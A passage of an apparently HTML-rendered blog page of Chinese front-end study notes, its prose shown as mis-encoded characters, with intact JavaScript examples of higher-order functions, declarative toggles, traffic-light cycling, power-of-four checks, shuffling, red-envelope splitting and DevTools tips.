&#123;</span><br><span class="line">        ret.push(fn.apply(<span class="built_in">this</span>, [obj, ...rest]));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fn.apply(<span class="built_in">this</span>, [subject, ...rest]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ä¸ºä»€ä¹ˆä½¿ç”¨é«˜é˜¶å‡½æ•°ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨é«˜é˜¶å‡½æ•°ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨é«˜é˜¶å‡½æ•°ï¼Ÿ"></a><strong>ä¸ºä»€ä¹ˆä½¿ç”¨é«˜é˜¶å‡½æ•°ï¼Ÿ</strong></h3><p>ä»£ç å¯ç»´æŠ¤â€¦å¦‚ä»£ç åº“çš„å¹³ç¨³å‡çº§ï¼š</p><p><img src="https://i.loli.net/2021/08/17/Pt9LqASyuVIN7OE.png" alt="image.png"></p><h2 id="å‘½ä»¤å¼ä¸å£°æ˜å¼"><a href="#å‘½ä»¤å¼ä¸å£°æ˜å¼" class="headerlink" title="å‘½ä»¤å¼ä¸å£°æ˜å¼"></a>å‘½ä»¤å¼ä¸å£°æ˜å¼</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‘½ä»¤å¼ ï¼ˆæˆ‘ä»¬è¦æ€ä¹ˆåšï¼‰</span></span><br><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> map1 = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; list.length; i++)&#123;</span><br><span class="line">map1.push(list[i] * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜å¼ ï¼ˆæˆ‘ä»¬è¦åšä»€ä¹ˆï¼‰</span></span><br><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">const</span> double = <span class="function"><span class="params">x</span> =&gt;</span> x * <span class="number">2</span>;</span><br><span class="line">list.map(double);</span><br></pre></td></tr></table></figure><h3 id="caseï¼šåˆ‡æ¢æŒ‰é’®"><a href="#caseï¼šåˆ‡æ¢æŒ‰é’®" class="headerlink" title="caseï¼šåˆ‡æ¢æŒ‰é’®"></a>caseï¼šåˆ‡æ¢æŒ‰é’®</h3><p><a href="https://code.h5jun.com/tuda/2/edit?js,output">å‘½ä»¤å¼</a>ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">switcher.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(evt.target.className === <span class="string">&#x27;on&#x27;</span>)&#123;</span><br><span class="line">    evt.target.className = <span class="string">&#x27;off&#x27;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    evt.target.className = <span class="string">&#x27;on&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://code.h5jun.com/nal/3/edit?js,output">å£°æ˜å¼</a>ï¼š(è‹¥æƒ³å˜æˆä¸‰æ€ã€ç›´æ¥æ·»åŠ  <code>evt =&gt; evt.target.className = &#39;warn&#39; </code>)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggle</span>(<span class="params">...actions</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> action = actions.shift();</span><br><span class="line">    actions.push(action);</span><br><span class="line">    <span class="keyword">return</span> action.apply(<span class="built_in">this</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">switcher.onclick = toggle(</span><br><span class="line">  <span class="function"><span class="params">evt</span> =&gt;</span> evt.target.className = <span class="string">&#x27;off&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="params">evt</span> =&gt;</span> evt.target.className = <span class="string">&#x27;on&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="Caseï¼šå®ç°ä¸€ä¸ªåˆ‡æ¢å¤šä¸ªäº¤é€šç¯çŠ¶æ€åˆ‡æ¢çš„åŠŸèƒ½"><a href="#Caseï¼šå®ç°ä¸€ä¸ªåˆ‡æ¢å¤šä¸ªäº¤é€šç¯çŠ¶æ€åˆ‡æ¢çš„åŠŸèƒ½" class="headerlink" title="Caseï¼šå®ç°ä¸€ä¸ªåˆ‡æ¢å¤šä¸ªäº¤é€šç¯çŠ¶æ€åˆ‡æ¢çš„åŠŸèƒ½"></a>Caseï¼šå®ç°ä¸€ä¸ªåˆ‡æ¢å¤šä¸ªäº¤é€šç¯çŠ¶æ€åˆ‡æ¢çš„åŠŸèƒ½</h2><h3 id="æ–¹æ³•ä¸€ã€ç›´è§‚å®ç°"><a href="#æ–¹æ³•ä¸€ã€ç›´è§‚å®ç°" class="headerlink" title="æ–¹æ³•ä¸€ã€ç›´è§‚å®ç°"></a>æ–¹æ³•ä¸€ã€ç›´è§‚å®ç°</h3><p>ï¼ˆå¾ˆä¸‘ï¼‰å‚è€ƒä»£ç è§<a href="https://code.h5jun.com/jezew/2/edit?js,output%EF%BC%8C%E4%B8%BB%E8%A6%81">https://code.h5jun.com/jezew/2/edit?js,outputï¼Œä¸»è¦</a> js éƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  traffic.className = <span class="string">&#x27;s1&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      traffic.className = <span class="string">&#x27;s2&#x27;</span>;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        traffic.className = <span class="string">&#x27;s3&#x27;</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          traffic.className = <span class="string">&#x27;s4&#x27;</span>;</span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            traffic.className = <span class="string">&#x27;s5&#x27;</span>;</span><br><span class="line">            <span class="built_in">setTimeout</span>(reset, <span class="number">1000</span>)</span><br><span class="line">          &#125;, <span class="number">1000</span>)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">      &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒã€æ•°æ®æŠ½è±¡"><a href="#æ–¹æ³•äºŒã€æ•°æ®æŠ½è±¡" class="headerlink" title="æ–¹æ³•äºŒã€æ•°æ®æŠ½è±¡"></a>æ–¹æ³•äºŒã€æ•°æ®æŠ½è±¡</h3><p>å‚è€ƒä»£ç è§ <a href="https://code.h5jun.com/xof/5/edit?js,output%EF%BC%8C">https://code.h5jun.com/xof/5/edit?js,outputï¼Œ</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"><span class="comment">// æŠ½è±¡å‡ºæ•°æ®åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">const</span> stateList = [</span><br><span class="line">  &#123;<span class="attr">state</span>: <span class="string">&#x27;wait&#x27;</span>, <span class="attr">last</span>: <span class="number">1000</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">state</span>: <span class="string">&#x27;stop&#x27;</span>, <span class="attr">last</span>: <span class="number">3000</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">state</span>: <span class="string">&#x27;pass&#x27;</span>, <span class="attr">last</span>: <span class="number">3000</span>&#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params">traffic, stateList</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">applyState</span>(<span class="params">stateIdx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;state, last&#125; = stateList[stateIdx];</span><br><span class="line">    traffic.className = state;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      applyState((stateIdx + <span class="number">1</span>) % stateList.length);</span><br><span class="line">    &#125;, last)</span><br><span class="line">  &#125;</span><br><span class="line">  applyState(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start(traffic, stateList);</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰ã€è¿‡ç¨‹æŠ½è±¡"><a href="#æ–¹æ³•ä¸‰ã€è¿‡ç¨‹æŠ½è±¡" class="headerlink" title="æ–¹æ³•ä¸‰ã€è¿‡ç¨‹æŠ½è±¡"></a>æ–¹æ³•ä¸‰ã€è¿‡ç¨‹æŠ½è±¡</h3><p><strong>å°† start æ–¹æ³•æŠ½è±¡æˆè½®è¯¢æ–¹æ³•</strong>ï¼Œé€šè¿‡é«˜é˜¶å‡½æ•°ã€‚å‚è€ƒä»£ç è§ <a href="https://code.h5jun.com/bodul/2/edit?js,output%EF%BC%8C">https://code.h5jun.com/bodul/2/edit?js,outputï¼Œ</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è½®è¯¢æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poll</span>(<span class="params">...fnList</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> stateIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> fn = fnList[stateIndex++ % fnList.length];</span><br><span class="line">    <span class="keyword">return</span> fn.apply(<span class="built_in">this</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">  traffic.className = state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> trafficStatePoll = poll(setState.bind(<span class="literal">null</span>, <span class="string">&#x27;wait&#x27;</span>),</span><br><span class="line">                            setState.bind(<span class="literal">null</span>, <span class="string">&#x27;stop&#x27;</span>),</span><br><span class="line">                            setState.bind(<span class="literal">null</span>, <span class="string">&#x27;pass&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(trafficStatePoll, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•å››ã€å¼‚æ­¥å®ç°"><a href="#æ–¹æ³•å››ã€å¼‚æ­¥å®ç°" class="headerlink" title="æ–¹æ³•å››ã€å¼‚æ­¥å®ç°"></a>æ–¹æ³•å››ã€å¼‚æ­¥å®ç°</h3><p>å‘½ä»¤å¼å†™æ³•ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> traffic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;traffic&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">time</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, time));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">  traffic.className = state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  setState(<span class="string">&#x27;wait&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> wait(<span class="number">1000</span>);</span><br><span class="line">    setState(<span class="string">&#x27;stop&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> wait(<span class="number">3000</span>);</span><br><span class="line">    setState(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> wait(<span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Caseï¼šåˆ¤æ–­æ˜¯å¦æ˜¯4çš„å¹‚"><a href="#Caseï¼šåˆ¤æ–­æ˜¯å¦æ˜¯4çš„å¹‚" class="headerlink" title="Caseï¼šåˆ¤æ–­æ˜¯å¦æ˜¯4çš„å¹‚"></a>Caseï¼šåˆ¤æ–­æ˜¯å¦æ˜¯4çš„å¹‚</h2><h3 id="æ–¹æ³•ä¸€-1"><a href="#æ–¹æ³•ä¸€-1" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num);</span><br><span class="line"><span class="keyword">while</span>(num &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(num % <span class="number">4</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">num /= <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒ-1"><a href="#æ–¹æ³•äºŒ-1" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num);</span><br><span class="line"><span class="keyword">while</span>(num &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(num % <span class="number">0b11</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">num &gt;&gt;&gt;= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰ä¸¤ç§æ—¶é—´å¤æ‚åº¦éƒ½ä¸º Oï¼ˆlogNï¼‰ã€‚</p><h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num);</span><br><span class="line">    <span class="comment">// ç¬¬äºŒä¸ªè¿‡æ»¤å‡º2çš„å¹‚</span></span><br><span class="line"><span class="keyword">return</span> num &gt; <span class="number">0</span> &amp;&amp; (num &amp; (num - <span class="number">1</span>)) === <span class="number">0</span> &amp;&amp; (num &amp; <span class="number">0xAAAAAAAA</span>) === <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¶é—´å¤æ‚åº¦ä¸º Oï¼ˆ1ï¼‰ï¼Œä½†å¥½åƒæ²¡å¿…è¦ã€‚</p><h3 id="æ–¹æ³•å››ã€æ­£åˆ™"><a href="#æ–¹æ³•å››ã€æ­£åˆ™" class="headerlink" title="æ–¹æ³•å››ã€æ­£åˆ™"></a>æ–¹æ³•å››ã€æ­£åˆ™</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPowerOfFour</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">num = <span class="built_in">parseInt</span>(num).toString(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="regexp">/^1(?:00)*$/</span>.test(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Caseï¼šæ´—ç‰Œ"><a href="#Caseï¼šæ´—ç‰Œ" class="headerlink" title="Caseï¼šæ´—ç‰Œ"></a>Caseï¼šæ´—ç‰Œ</h2><h3 id="æ–¹æ³•ä¸€ï¼ˆä¸æ­£ç¡®ï¼‰"><a href="#æ–¹æ³•ä¸€ï¼ˆä¸æ­£ç¡®ï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼ˆä¸æ­£ç¡®ï¼‰"></a>æ–¹æ³•ä¸€ï¼ˆä¸æ­£ç¡®ï¼‰</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cards = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">cards</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [...cards].sort(<span class="function">() =&gt;</span> <span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(shuffle(cards));</span><br></pre></td></tr></table></figure><p>ç»“æœå¹¶ä¸æ˜¯å…¬å¹³çš„ï¼å› ä¸º <strong>sort æ˜¯ä¸¤ä¸¤äº¤æ¢ï¼Œå¯¼è‡´æœ€åé¢çš„æ•°äº¤æ¢åˆ°æœ€å‰é¢çš„å¯èƒ½æ€§è¾ƒå°</strong>ã€‚</p><h3 id="æ–¹æ³•äºŒ-2"><a href="#æ–¹æ³•äºŒ-2" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>åœ¨å‰é¢çš„ç‰Œä¸­éšæœºæŠ½ä¸€å¼ ï¼Œå†æ¢åˆ°æœ€åçš„ä½ç½®å»ã€‚<a href="https://code.h5jun.com/huqi/edit?js,console,output">https://code.h5jun.com/huqi/edit?js,console,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cards = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">cards</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> c = [...cards];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = c.length; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">const</span> pIdx = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * i);</span><br><span class="line">    [c[pIdx], c[i - <span class="number">1</span>]] = [c[i - <span class="number">1</span>], c[pIdx]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æµ‹è¯•</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="built_in">Array</span>(<span class="number">10</span>).fill(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">const</span> c = shuffle(cards);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">    result[j] += c[j];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(shuffle(cards));</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰ï¼ˆæ”¹è¿›ï¼‰"><a href="#æ–¹æ³•ä¸‰ï¼ˆæ”¹è¿›ï¼‰" class="headerlink" title="æ–¹æ³•ä¸‰ï¼ˆæ”¹è¿›ï¼‰"></a>æ–¹æ³•ä¸‰ï¼ˆæ”¹è¿›ï¼‰</h3><p>ä¸æ´—å®Œæ‰€æœ‰çš„ç‰Œï¼Œå€ŸåŠ©<strong>ç”Ÿæˆå™¨</strong>ã€‚<a href="https://code.h5jun.com/zamuv/edit?js,console,output">https://code.h5jun.com/zamuv/edit?js,console,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cards = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> * <span class="title">draw</span>(<span class="params">cards</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> c = [...cards];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = c.length; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">const</span> pIdx = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * i);</span><br><span class="line">    [c[pIdx], c[i - <span class="number">1</span>]] = [c[i - <span class="number">1</span>], c[pIdx]];</span><br><span class="line">    <span class="keyword">yield</span> c[i - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = draw(cards);</span><br><span class="line"><span class="built_in">console</span>.log([...result]);</span><br></pre></td></tr></table></figure><h2 id="Caseï¼šåˆ†çº¢åŒ…"><a href="#Caseï¼šåˆ†çº¢åŒ…" class="headerlink" title="Caseï¼šåˆ†çº¢åŒ…"></a>Caseï¼šåˆ†çº¢åŒ…</h2><h3 id="æ–¹æ³•ä¸€-2"><a href="#æ–¹æ³•ä¸€-2" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>æ¯æ¬¡åˆ‡æœ€å¤§çš„çº¢åŒ…ã€‚å¼Šç«¯ï¼šæœ‰ç‚¹å‡åŒ€ã€‚<a href="https://code.h5jun.com/wuv/1/edit?js,console,output">https://code.h5jun.com/wuv/1/edit?js,console,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params">amount, count</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ret = [amount];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span>(count &gt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//æŒ‘é€‰å‡ºæœ€å¤§ä¸€å—è¿›è¡Œåˆ‡åˆ†</span></span><br><span class="line">    <span class="keyword">let</span> cake = <span class="built_in">Math</span>.max(...ret),</span><br><span class="line">        idx = ret.indexOf(cake),</span><br><span class="line">        part = <span class="number">1</span> + <span class="built_in">Math</span>.floor((cake / <span class="number">2</span>) * <span class="built_in">Math</span>.random()),</span><br><span class="line">        rest = cake - part;</span><br><span class="line">    </span><br><span class="line">    ret.splice(idx, <span class="number">1</span>, part, rest);</span><br><span class="line">    </span><br><span class="line">    count--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> amountEl = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;amount&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> countEl = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;count&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> generateBtn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;generateBtn&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> resultEl = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>);</span><br><span class="line"></span><br><span class="line">generateBtn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> amount = <span class="built_in">Math</span>.round(<span class="built_in">parseFloat</span>(amountEl.value) * <span class="number">100</span>);</span><br><span class="line">  <span class="keyword">let</span> count = <span class="built_in">parseInt</span>(countEl.value);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> output = [];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">isNaN</span>(amount) || <span class="built_in">isNaN</span>(count) </span><br><span class="line">     || amount &lt;= <span class="number">0</span> || count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    output.push(<span class="string">&#x27;è¾“å…¥æ ¼å¼ä¸æ­£ç¡®ï¼&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(amount &lt; count)&#123;</span><br><span class="line">    output.push(<span class="string">&#x27;é’±ä¸å¤Ÿåˆ†&#x27;</span>)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    output.push(...generate(amount, count));</span><br><span class="line">    output = output.map(<span class="function"><span class="params">m</span> =&gt;</span> (m / <span class="number">100</span>).toFixed(<span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  resultEl.innerHTML = <span class="string">&#x27;&lt;li&gt;&#x27;</span> + </span><br><span class="line">                        output.join(<span class="string">&#x27;&lt;/li&gt;&lt;li&gt;&#x27;</span>) +</span><br><span class="line">                       <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒ-3"><a href="#æ–¹æ³•äºŒ-3" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>åˆ‡åˆ†ï¼Œç±»ä¼¼äºæ´—ç‰Œï¼Œä»¥åˆ†ä¸ºå•å…ƒï¼Œå†1â€”â€”9999ä¸­æ´—ç‰Œï¼Œåˆ‡æœ€å‰é¢10åˆ€ã€‚ï¼ˆä¸å­˜åœ¨æ³•ä¸€çš„é—®é¢˜ï¼‰</p><p><img src="https://i.loli.net/2021/08/17/7ELKMjhesOnvUJ8.png" alt="image.png"></p><h1 id="å‰ç«¯å¼€å‘è°ƒè¯•çŸ¥è¯†"><a href="#å‰ç«¯å¼€å‘è°ƒè¯•çŸ¥è¯†" class="headerlink" title="å‰ç«¯å¼€å‘è°ƒè¯•çŸ¥è¯†"></a>å‰ç«¯å¼€å‘è°ƒè¯•çŸ¥è¯†</h1><h2 id="åŠ¨æ€ä¿®æ”¹å…ƒç´ ä¸æ ·å¼"><a href="#åŠ¨æ€ä¿®æ”¹å…ƒç´ ä¸æ ·å¼" class="headerlink" title="åŠ¨æ€ä¿®æ”¹å…ƒç´ ä¸æ ·å¼"></a>åŠ¨æ€ä¿®æ”¹å…ƒç´ ä¸æ ·å¼</h2><h3 id="ä¸€ã€Elements"><a href="#ä¸€ã€Elements" class="headerlink" title="ä¸€ã€Elements"></a>ä¸€ã€Elements</h3><ul><li>DevTools é‡Œé¢ Styles ä¸­ç‚¹å‡» .cls å¼€å¯åŠ¨æ€ä¿®æ”¹å…ƒç´ çš„ classï¼Œè¾“å…¥å­—ç¬¦ä¸²å¯ä»¥åŠ¨æ€çš„ç»™å…ƒç´ æ·»åŠ ç±»åã€‚</li><li>Computed ä¸‹ç‚¹å‡»æ ·å¼é‡Œçš„ç®­å¤´å¯ä»¥è·³è½¬åˆ° styles é¢æ¿ä¸­çš„ css è§„åˆ™ã€‚</li><li>ä¿®æ”¹åŠ¨æ€æ ·å¼ï¼ˆ:hoverï¼‰æ—¶ï¼Œå¯ä»¥å¦‚ç¬¬ä¸€ç‚¹ï¼Œç‚¹å‡» :hov ï¼›æˆ–è€… DOM å…ƒç´ å³å‡» -&gt; Force state -&gt; :hoverã€‚</li></ul><h3 id="äºŒã€Console"><a href="#äºŒã€Console" class="headerlink" title="äºŒã€Console"></a>äºŒã€Console</h3><ul><li> çµæ´»ä½¿ç”¨ logã€warnã€errorã€debugã€info 